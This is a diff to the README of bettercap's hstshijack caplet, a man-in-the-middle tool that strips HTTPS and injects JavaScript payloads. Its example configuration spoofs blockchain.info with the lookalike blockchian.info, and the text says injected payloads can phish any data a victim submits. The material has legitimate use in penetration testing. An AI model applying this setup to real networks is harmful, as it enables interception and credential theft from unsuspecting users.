@@ -7,7 +7,7 @@
 ```sh
 set hstshijack.log             caplets/hstshijack/ssl.log
 set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
-set hstshijack.ignore          github.com,*.github.com
+set hstshijack.ignore          *
 set hstshijack.targets         blockchain.info,*.blockchain.info
 set hstshijack.replacements    blockchian.info,*.blockchian.info
 #set hstshijack.blockscripts    domain.com,*.domain.com
@@ -61,7 +61,7 @@ Example:
 hstshijack.custompayloads *:caplets/hstshijack/payloads/sslstrip.js,google.com:caplets/hstshijack/payloads/google.js,*.google.com:caplets/hstshijack/payloads/google.js
 ```
 
-Once the payload is injected into a page, you can technically phish any data unless the user navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
+Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
 
 <a href="./payloads/sslstrip.js">**sslstrip.js**</a> is included, which strips the `s` from all `https://` instances in `<a href="...` tags.
 
@@ -108,4 +108,6 @@ form.onsubmit = function() {
 
 The following POST request will be sniffed by bettercap, but not proxied. 
 
-Any instance of `obf_path_callback` will be replaced with the callback path that bettercap listens for (this can save time when writing JavaScript payloads).
+As soon as bettercap receives a callback, any request from the client for a spoofed hostname will immediately be redirected to the legitimate hostname, and any request for that targeted hostname will no longer be spoofed for this particular client.
+
+Note: Any instance of `obf_path_callback` will be replaced with the callback path that bettercap listens for (this can save time when writing JavaScript payloads).
